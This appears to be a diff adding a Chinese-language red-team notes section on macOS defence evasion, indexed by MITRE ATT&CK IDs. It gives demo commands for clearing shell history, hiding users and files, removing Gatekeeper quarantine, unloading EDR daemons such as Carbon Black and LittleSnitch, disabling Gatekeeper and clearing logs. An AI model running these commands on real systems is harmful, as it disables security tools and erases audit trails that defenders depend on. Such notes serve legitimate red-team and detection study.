@@ -608,3 +608,231 @@ DCShadow通过注册和模仿Domain Controller来操纵AD域的数据
 Mimikatz中已有模块实现这个功能
 
 这个没法实现
+
+## macos
+
+## T1027.001 - Binary Padding
+
+红队可以使用binary padding来改变二进制文件的大小，从而可以绕过杀毒软件对大小的限制，绕过检测，同时也可以绕过基于hash值的病毒检测，demo如下
+
+```
+dd if=/dev/zero bs=1 count=1 >> evil_binary
+```
+
+
+
+## T1070.003 - Clear Command History
+
+当用户登陆在登陆状态下，command历史将保存在`HISTFILE`环境变量中，当用户登出系统，这些消息将存入用户的`~/.bash_history`文件中。
+
+红队可以使用许多方法来防止命令被记录，包括清除环境变量（`unset HISTFILE`），设置环境变量为零（`export HISTFILESIZE=0`），或者手工清除命令（history -c），或者`rm ~/.bash_history`，demo如下
+
+```
+rm ~/.bash_history
+echo "" > ~/.bash_history
+cat /dev/null > ~/.bash_history
+ln -sf /dev/null ~/.bash_history
+unset HISTFILE
+export HISTFILESIZE=0
+history -c
+```
+
+或者禁止命令记录
+
+```
+set +o history
+echo 'set +o history' >> ~/.bashrc
+. ~/.bashrc
+history -c
+```
+
+或者在命令前加空格，来禁止命令记录
+
+```
+ whoami	#注意命令前有空格
+ ls -al #注意命令前有空格
+```
+
+
+
+## T1036.006 - Space after Filename
+
+红队在文件名后加一个空格（例如`evil.txt `），这样用户双击这个文件的时候将不再以txt默认的方式进行打开，红队可利用这点诱导用户打开一个看似正常的文件，从而导致binary运行。demo如下
+
+第一步
+
+```
+echo '#!/bin/bash\necho "print "hello, world!"" | /usr/bin/python\nexit' > execute.txt && chmod +x execute.txt
+```
+
+第二部
+
+```
+mv execute.txt "execute.txt "
+```
+
+第三部：用户双击这个文件，该文件被执行
+
+
+
+## T1497.001 - System Checks
+
+红队根据进程、cpu核心数量，内存大小等因素判断自己是否处在虚拟机中
+
+```
+if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;
+```
+
+
+
+## T1564.002 - Hidden Users
+
+红队可以将自己创建的账户隐藏起来。在macOS系统中所有的账户都关联了一个userID，当用户被创建，就可以观察到这个userID
+
+在`/Library/Preferences/com.apple.loginwindow`中有个变量叫`Hide500Users`，它可以使userID低于500的用户不在屏幕中显示，当用户创建userID低于500时（例如：`sudo dscl . -create /Users/username UniqueID 401`）并且`Hide500Users`这个变量设置“Yes”，那么这个账号就不会再显示。Demo如下
+
+###### Demo1 创建一个UniqueID小于500的用户
+
+创建一个UniqueID小于500的用户,默认情况下这个账户是隐藏的
+
+```
+sudo dscl . -create /Users/#{user_name} UniqueID 333
+```
+
+###### Demo2 用IsHidden参数创建一个隐藏账户
+
+```
+sudo dscl . -create /Users/#{user_name} IsHidden 1
+```
+
+
+
+## T1564.001 - Hidden Files and Directories
+
+红队可以设置文件和目录的隐藏属性来绕过防御机制，在linux和mac中将目录和文件名称前加"."就可以实现“l s”等通常命令的隐藏。
+
+在macOS系统中，也可以设置UF_HIDDEN的标识符，实现在Finder.app中的隐藏，但仍可以在Terminal.app中看到。Demo如下
+
+###### Demo1 在隐藏文件夹中创建隐藏文件
+
+```
+mkdir /var/tmp/.hidden-directory
+echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
+```
+
+###### Demo2 在mac中隐藏文件
+
+```
+xattr -lr * / 2>&1 /dev/null | grep -C 2 "00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00"
+```
+
+###### Demo3 隐藏目录
+
+```
+touch /var/tmp/T1564.001_mac.txt
+chflags hidden /var/tmp/T1564.001_mac.txt
+```
+
+###### Demo4 隐藏文件
+
+```
+setfile -a V #{filename}
+```
+
+###### Demo5 显示所有隐藏的文件
+
+```
+defaults write com.apple.finder AppleShowAllFiles YES
+```
+
+
+
+## T1553.001 - Gatekeeper Bypass
+
+Gatekeeper的作用就是检测从互联网上下载或从其他地方安装的软件，他们在系统中首次运行时，确保他们的行为对系统没有危害
+
+默认情况下只允许用户安装来自苹果应用商店的软件，如果需要安装从网上下载或者其他地方复制的软件，系统会弹出提示框并阻止软件运行
+
+Gatekeeper如何判断软件是网上下载的还是应用商店下载的：使用浏览器下载的程序都会被打上标签，l s -al 查看的时候，会看到多了一个@标签，可以使用`xattr -l`查看标签的信息，这些信息即使在软件复制，打包或者制作镜像时也不会被删除
+
+Gatekeeper如何进行安全检测：基于规则进行检测，相关文件在/var/db/SystemPolicy中查看
+
+###### Demo1 Gatekeeper绕过
+
+简单的来说就是使用xattr命令删除标签信息
+
+```
+sudo xattr -d com.apple.quarantine #{app_path}
+```
+
+
+
+## T1070.004 - File Deletion
+
+这个就是删除文件
+
+```
+rm -fr XXX
+```
+
+
+
+## T1562.001 - Disable or Modify Tools
+
+红队可以关闭安全策略来避免自己被检测到，Demo如下
+
+###### 关闭Carbon Black Response
+
+```
+sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
+sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
+```
+
+###### 关闭LittleSnitch
+
+```
+sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
+```
+
+###### 关闭OpenDNS Umbrella
+
+```
+sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
+```
+
+###### 关闭Gatekeeper
+
+```
+sudo spctl --master-disable
+```
+
+
+
+## T1148 - HISTCONTROL
+
+`HISTCONTROL`这个环境变量决定什么命令日志是否要在`history`中保存,并在用户退出的时候保存在`~/.bash_history`.它可以通过`ignorespace`开头的"空格键"设置忽略命令,它也可以设置忽略重复命令通过"ignoredups",也可以设置"ignoreboth"来忽略以上两个,这意味着“ ls”不会被保存,而"ls"会被保存,红队可以使用这个方法来隐藏痕迹，Demo如下
+
+###### Demo1 关掉历史信息收集
+
+```
+export HISTCONTROL=ignoreboth
+```
+
+输入第一个字符是空格的命令，或者命令在history中已经存在,这样日志就不进行记录了
+
+
+
+## T1070.002 - Clear Linux or Mac System Logs
+
+Adversaries may clear system logs to hide evidence of an intrusion.  macOS and Linux both keep track of system or user-initiated actions via  system logs. The majority of native system logging is stored under the `/var/log/` directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)
+
+红队可以通过清除历史日志来隐藏痕迹，系统主要的日志存放在`/var/log`目录中
+
+- `/var/log/messages:` 系统相关日志
+- `/var/log/secure` 与 `/var/log/auth.log`: 认证日志
+- `/var/log/utmp` or `/var/log/wtmp`: 登陆日志
+- `/var/log/kern.log`: 内核日志
+- `/var/log/cron.log`: 任务调度日志
+- `/var/log/maillog`: 邮件服务日志
+- `/var/log/httpd/`: web服务相关日志
+
